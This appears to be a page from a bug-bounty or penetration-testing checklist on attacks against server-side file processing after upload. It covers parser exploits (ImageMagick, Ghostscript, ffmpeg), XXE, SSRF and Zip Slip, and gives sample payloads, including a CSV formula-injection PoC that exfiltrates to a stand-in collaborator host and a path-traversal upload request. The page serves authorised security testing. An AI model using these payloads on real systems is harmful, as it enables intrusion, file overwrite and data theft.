# File-Processing Edge Cases (what happens AFTER upload)

**What it is:** The bug is rarely "upload a PHP shell" — it's what the server does *with* the file afterward: parse it, preview it, convert it, scan it, store it, serve it. Each step is attack surface. See also `01-upload-attacks.md` (exec) and `02-xss-via-image-upload.md` (XSS).

## 1. Parser / converter exploitation
The server opens your file with a library → that library is the target.
- [ ] **Image parsers:** ImageMagick (ImageTragick / `MSL`/`ephemeral` delegates → RCE/SSRF), libpng/exif crashes.
- [ ] **PDF → image/preview:** Ghostscript (`-dSAFER` bypasses → RCE), PDF with embedded JS / external references (SSRF).
- [ ] **Document converters:** LibreOffice/soffice, pandoc → macro/formula/external-entity abuse.
- [ ] **SVG/XML:** rendered → XXE (`03-injection/05`) / SSRF / XSS.
- [ ] **CSV/XLSX ingested later:** formula injection (`=cmd|'/c calc'!A1`, `=HYPERLINK(...)`, `=WEBSERVICE(...)`) executes when staff open it in Excel → second-order (`09-advanced/01`).
- [ ] **Archive extraction:** Zip Slip (`../` inside zip) → write outside target dir; symlink in tar → read arbitrary files.
- [ ] **Video/audio (ffmpeg):** crafted playlist/`concat`/`subfile` → SSRF / local file read (`file://`, `http://169.254.169.254`).

## 2. AV / scanner bypass → stored active content
- [ ] Split/encode/password-protect the payload so the scanner passes it, but a later step reassembles/serves it live.
- [ ] Polyglot (valid image + active content) that the scanner sees as an image but the browser runs as HTML/SVG.

## 3. Metadata leakage
- [ ] Server strips nothing → uploaded images leak **GPS/EXIF, author, original path, internal hostnames** to other users.
- [ ] Conversely, injected EXIF (`-Comment`) renders in a gallery → stored XSS (`02-xss-via-image-upload.md`).

## 4. Path confusion / overwrite
- [ ] Attacker-controlled `filename`/`path` → traversal writes outside the upload dir or **overwrites another user's file / a system file**:
```http
POST /api/v2/files HTTP/2
Content-Type: multipart/form-data; boundary=x

--x
Content-Disposition: form-data; name="file"; filename="../../avatars/victim_uuid.png"
Content-Type: image/png

<png>
--x--
```
```http
HTTP/2 200 OK
{"stored":"/avatars/victim_uuid.png"}      ← overwrote victim's avatar (or a config file)
```
- [ ] Predictable storage path → overwrite others' uploads (integrity/defacement).

## 5. Download / retrieval authorization
- [ ] The upload is authz'd but the **download endpoint is not** (`/files/<uuid>` returns anyone's file → IDOR, `01-access-control/01`).
- [ ] Signed URL with weak/predictable signature, no expiry, or removable signature param.
- [ ] Range/`Content-Disposition` tricks: force `inline` rendering of a user file on-origin → XSS.

## 6. Content-type / extension mismatch downstream
- [ ] Server trusts your `Content-Type` at store time; a later consumer trusts the extension → mismatch causes a different (dangerous) handler to run.
- [ ] File served with sniffable type + no `nosniff` → HTML/JS execution (`05-client-side/06`).

## 🎯 PoC — Request → Response (CSV formula injection, second-order)
```http
POST /api/v2/contacts/import HTTP/2
Host: api.target.com
Authorization: Bearer <mine>
Content-Type: text/csv

name,email
=HYPERLINK("https://COLLAB/x","click"),me@evil.com
```
```http
HTTP/2 200 OK
{"imported":1}
```
When an admin exports/opens the contact list in Excel, the formula fires (Collaborator hit / `WEBSERVICE` exfil).

## Impact
RCE (parsers), SSRF (converters/ffmpeg), stored XSS, file overwrite/defacement, cross-user file disclosure, data exfil via formulas.

## Report notes
Prove the *downstream* effect (parser OOB hit, overwritten file, foreign file downloaded, formula callback), not just a successful upload. Benign payloads only; delete test artifacts.

## Tools
`exiftool`, ImageTragick PoCs, `ffmpeg` SSRF payloads, `evilarc`/zip-slip generators, Burp, Collaborator.

## Deep cuts — thumbnailers, cloud, and specific gadgets
- [ ] **Server-side image thumbnailer SSRF/file-read:** an SVG/`<image href>` processed by the resizer fetches `file:///etc/passwd` or `http://169.254.169.254` — the render worker has no user context (IDOR + SSRF, `03-injection/06`). Also `libvips`/`sharp`/`ImageMagick` delegate abuse.
- [ ] **ImageMagick specifics:** MVG/MSL polyglot, `image over 'url(https://collab)'`, `ephemeral:`/`msl:`/`https:` delegates, `-authenticate` shell-metachar (ImageTragick family). Ghostscript `-dSAFER` escapes via `%pipe%`/`.forceput`.
- [ ] **ffmpeg HLS/concat SSRF & file-read:** upload an `.m3u8`/`.avi` with `#EXT-X-...` or `concat:`/`subfile:`/`file:` pointing at internal URLs or local files → contents exfil into the transcoded output.
- [ ] **Office/DDE/macro:** DDE formula in DOCX/XLSX, `oleObject`, external template injection (`.docx` `settings.xml` `attachedTemplate` → SSRF/NTLM leak), remote image for SMB/HTTP callback.
- [ ] **Presigned/direct-cloud (repeat, critical):** tamper the presigned PUT `key`/`Content-Type`/ACL to overwrite arbitrary objects, plant HTML on the app origin, or make a private bucket object public (`08-infra/04`).
- [ ] **Signed-download-URL flaws:** strip the signature param, extend/ignore expiry, swap the object id (IDOR), or downgrade `response-content-disposition` to `inline` to force on-origin render.
- [ ] **XXE via office/zip XML** (`03-injection/05`): inject into `word/document.xml`/`[Content_Types].xml`, re-zip, feed to the converter/preview.
- [ ] **AV/scanner bypass:** EICAR to confirm scanning exists, then split/encrypt/nest the payload so the scanner passes it but a later reassembly serves it live (TOCTOU with the scan window).
- [ ] **Zip-slip / tar-symlink (repeat):** write outside the extract dir or read arbitrary files via a symlink entry; `evilarc`/manual.

## Related
`06-file-upload/01-upload-attacks.md` · `06-file-upload/02-xss-via-image-upload.md` · `03-injection/05-xxe.md` · `03-injection/06-ssrf.md` · `08-infra/04-secrets-and-exposure.md` · `09-advanced/01-second-order.md`
